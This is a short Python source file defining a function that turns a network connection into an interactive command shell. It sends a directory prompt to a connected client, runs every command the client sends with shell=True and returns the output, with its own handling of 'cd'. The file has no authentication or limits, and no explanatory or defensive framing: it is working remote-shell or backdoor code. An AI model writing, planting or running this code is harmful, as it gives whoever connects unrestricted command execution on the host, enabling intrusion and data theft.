from subprocess import check_output
from os import chdir

def shell(client):

	command = ''
	working_directory = check_output('pwd', shell=True)[:-1]

	client.send(working_directory + b'$ ')

	while command.strip() != 'exit':
		command = client.recv(1024)
		if command.startswith(b'cd'):
			chdir(command.split()[1])
			working_directory = check_output('pwd', shell=True)[:-1]
			output = working_directory + b'$ '
		else:
			try:
				output = check_output(command, shell=True)
			except:
				output = bytes(f'{command}: command not found', 'utf-8')

		client.send(output + b'\n' + working_directory + b'$ ')
